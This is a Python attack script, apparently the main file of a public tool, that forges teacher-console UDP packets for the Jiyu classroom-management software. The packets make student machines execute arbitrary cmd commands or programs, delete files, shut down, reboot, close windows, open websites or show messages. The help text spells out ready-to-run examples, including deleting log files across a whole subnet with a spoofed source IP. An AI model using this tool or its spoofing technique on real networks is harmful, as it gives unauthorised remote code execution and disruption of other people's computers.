# pylint: disable=all

"""
Jiyu Attack Script

This script implements a Jiyu attack by sending specially crafted UDP packets to a target IP address.
It allows the user to input a message, which is then formatted and packaged into a byte array before being sent.

The script uses Scapy for packet manipulation and sending.
"""

import argparse
import binascii

from typing import Any, Sequence, cast

from sender import broadcast_packet
from packet import (
    pkg_close_top_window,
    pkg_close_windows,
    pkg_message,
    pkg_shutdown,
    pkg_rename,
    pkg_website,
    pkg_execute,
    pkg_customize,
)


class ModeOptionalAction(argparse.Action):
    """
    Custom action for handling optional arguments in argparse.
    This action allows the user to specify a mode (e.g., --max or --min) for the program execution.
    """

    def __init__(self, option_strings: Sequence[str], dest: str, modes: Sequence[str], **kwargs: Any):
        self.modes = list(modes)

        if any("-" in mode for mode in self.modes):
            raise ValueError("Modes cannot contain '-' characters. Please use a different character.")

        _option_strings = []
        for option in option_strings:
            _option_strings.append(option)

            for mode in self.modes:
                if option.startswith("--"):
                    if option.startswith(f"--{mode}-"):
                        raise ValueError(
                            f"Option '{option}' cannot start with '--{mode}-'. "
                            "Please use a different prefix for modes."
                        )
                    _option_strings.append(f"--{mode}-{option[2:]}")

        return super().__init__(_option_strings, dest, **kwargs)

    def __call__(
        self,
        parser: argparse.ArgumentParser,
        namespace: argparse.Namespace,
        values: Any,
        option_string: str | None = None,
    ):
        if option_string in self.option_strings:
            option_string = cast(str, option_string)
            if option_string.startswith("--"):
                mode = option_string.split("-")[2]
                if mode not in self.modes:
                    mode = None
            else:
                mode = None
            setattr(namespace, self.dest, (mode, values))

    def format_usage(self) -> str:
        return " | ".join(self.option_strings)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="Jiyu Attack Script",
        epilog="Github Repositories: https://github.com/weilycoder/Jiyu_udp_attack/tree/main/ \n \n"
        "Example usage:\n"
        '    python Jiyu_udp_attack -t 192.168.106.100 -m "Hello World"\n'
        "    python Jiyu_udp_attack -t 192.168.106.104 -w https://www.github.com\n"
        '    python Jiyu_udp_attack -t 192.168.106.0/24 -f 192.168.106.2 -c "del *.log" -i 1000\n'
        "    python Jiyu_udp_attack -t 224.50.50.42 -e calc.exe\n"
        "    python Jiyu_udp_attack -t 224.50.50.42 --maximize-execute notepad.exe\n"
        '    python Jiyu_udp_attack -t 224.50.50.42 -s 60 "System is going to shutdown."\n'
        '    python Jiyu_udp_attack -t 192.168.106.105-120 -r 30 "Rebooting."\n'
        "    python Jiyu_udp_attack -t 192.168.106.255 -cw\n"
        "    python Jiyu_udp_attack -t 192.168.106.100 -ctw\n"
        "    python Jiyu_udp_attack -t 192.168.106.100 -n hacker 1000\n"
        "    python Jiyu_udp_attack -t 192.168.106.100 --hex 444d4f43000001002a020000\n"
        '    python Jiyu_udp_attack -t 192.168.106.100 --pkg ":{rand16.size_2}"\n'
        '    python Jiyu_udp_attack -t 192.168.106.100 --pkg ":{0.int.little_4}" 1024\n'
        '    python Jiyu_udp_attack -t 192.168.106.100 --pkg ":{0}{1.size_800}" 4d hello\n'
        "    python Jiyu_udp_attack -t 192.168.106.100 --pkg test.txt 1024 hello\n",
        formatter_class=argparse.RawTextHelpFormatter,
    )
    network_config_group = parser.add_argument_group(
        "Network Configuration", "Specify the network configuration for the attack."
    )
    network_config_group.add_argument(
        "-f",
        "--teacher-ip",
        type=str,
        metavar="<ip>",
        default=None,
        help="Teacher's IP address",
    )
    network_config_group.add_argument(
        "-fp",
        "--teacher-port",
        type=int,
        metavar="<port>",
        default=None,
        help="Teacher's port (default to random port)",
    )
    network_config_group.add_argument(
        "-t",
        "--target",
        type=str,
        metavar="<ip>",
        required=True,
        help="Target IP address",
    )
    network_config_group.add_argument(
        "-tp",
        "--target-port",
        type=int,
        metavar="<port>",
        default=4705,
        help="Port to send packets to (default: 4705)",
    )
    network_config_group.add_argument(
        "-i",
        "--ip-id",
        type=int,
        metavar="<ip_id>",
        default=None,
        help="IP ID for the packet (default: random ID)",
    )

    attack_action_group = parser.add_argument_group(
        "Attack Action", "Specify the action to perform on the target machine. "
    )
    attack_action = attack_action_group.add_mutually_exclusive_group(required=True)
    attack_action.add_argument(
        "-m",
        "--message",
        type=str,
        metavar="<msg>",
        help="Send a message to the target machine",
    )
    attack_action.add_argument(
        "-w",
        "--website",
        type=str,
        metavar="<url>",
        help="Open a website on the target machine",
    )
    attack_action.add_argument(
        "-c",
        "--command",
        type=str,
        metavar="<command>",
        help="Execute a command on the target machine\n(`cmd /D /C <command>`, Windows only)",
    )
    temp = attack_action.add_argument(
        "-e",
        "--execute",
        nargs="+",
        default=None,
        action=ModeOptionalAction,
        modes=("minimize", "maximize"),
        metavar=("<program>", "<args>"),
        help="Execute a program with arguments on the target machine",
    )
    attack_action.add_argument(
        "-s",
        "--shutdown",
        nargs="*",
        default=None,
        metavar=("<timeout>", "<message>"),
        help="Shutdown the target machine,\noptionally with a timeout and message",
    )
    attack_action.add_argument(
        "-r",
        "--reboot",
        nargs="*",
        default=None,
        metavar=("<timeout>", "<message>"),
        help="Reboot the target machine,\noptionally with a timeout and message",
    )
    attack_action.add_argument(
        "-cw",
        "--close-windows",
        nargs="*",
        default=None,
        metavar=("<timeout>", "<message>"),
        help="Close all windows on the target machine",
    )
    attack_action.add_argument(
        "-ctw",
        "--close-top-window",
        action="store_true",
        help="Close the top window on the target machine",
    )
    attack_action.add_argument(
        "-n",
        "--rename",
        nargs=2,
        metavar=("<name>", "<name_id>"),
        help="Rename the target machine",
    )
    attack_action.add_argument(
        "--hex",
        type=str,
        metavar="<hex_data>",
        help="Send raw hex data to the target machine",
    )
    attack_action.add_argument(
        "--pkg",
        nargs="+",
        metavar=("<custom_data>", "<args>"),
        help="Custom packet data to send",
    )

    args = parser.parse_args()
    teacher_ip = args.teacher_ip
    teacher_port = args.teacher_port
    target = args.target
    port = args.target_port

    try:
        if args.message:
            payload = pkg_message(args.message)
        elif args.website:
            payload = pkg_website(args.website)
        elif args.command:
            payload = pkg_execute("cmd.exe", f'/D /C "{args.command}"', "minimize")
        elif args.close_top_window:
            payload = pkg_close_top_window()
        elif args.execute:
            match args.execute:
                case [mode, [program]]:
                    args_list = ""
                case [mode, [program, args_list]]:
                    pass
                case _:
                    parser.error("Invalid execute arguments: expected [program] or [program, args_list]")
            payload = pkg_execute(program, args_list, "normal" if mode is None else mode)
        elif args.shutdown is not None:
            match args.shutdown:
                case []:
                    payload = pkg_shutdown()
                case [timeout]:
                    payload = pkg_shutdown(timeout=int(timeout))
                case [timeout, message]:
                    payload = pkg_shutdown(timeout=int(timeout), message=message)
                case _:
                    parser.error("Invalid shutdown arguments: expected [timeout] or [timeout, message]")
        elif args.reboot is not None:
            match args.reboot:
                case []:
                    payload = pkg_shutdown(reboot=True)
                case [timeout]:
                    payload = pkg_shutdown(timeout=int(timeout), reboot=True)
                case [timeout, message]:
                    payload = pkg_shutdown(timeout=int(timeout), message=message, reboot=True)
                case _:
                    parser.error("Invalid reboot arguments: expected [timeout] or [timeout, message]")
        elif args.close_windows is not None:
            match args.close_windows:
                case []:
                    payload = pkg_close_windows()
                case [timeout]:
                    payload = pkg_close_windows(timeout=int(timeout))
                case [timeout, message]:
                    payload = pkg_close_windows(timeout=int(timeout), message=message)
                case _:
                    parser.error("Invalid close windows arguments: expected [timeout] or [timeout, message]")
        elif args.rename:
            name, name_id = args.rename
            payload = pkg_rename(name, int(name_id))
        elif args.hex:
            payload = binascii.unhexlify(args.hex.replace(" ", ""))
        elif args.pkg:
            format_str, *user_args = args.pkg
            if not format_str.startswith(":"):
                with open(format_str, "r", encoding="utf-8") as f:
                    format_str = f.read().strip()
            else:
                format_str = format_str[1:]  # Remove leading ':'
            payload = pkg_customize(format_str, *user_args)
        else:
            raise ValueError("Program logic error, please report this issue: No valid action specified.")

        broadcast_packet(teacher_ip, teacher_port, target, port, payload, ip_id=args.ip_id)
        print(f"Packet sent to {target} on port {port} with payload length {len(payload)} bytes")
    except Exception as e:
        parser.error(f"({e.__class__.__name__}) {e}")
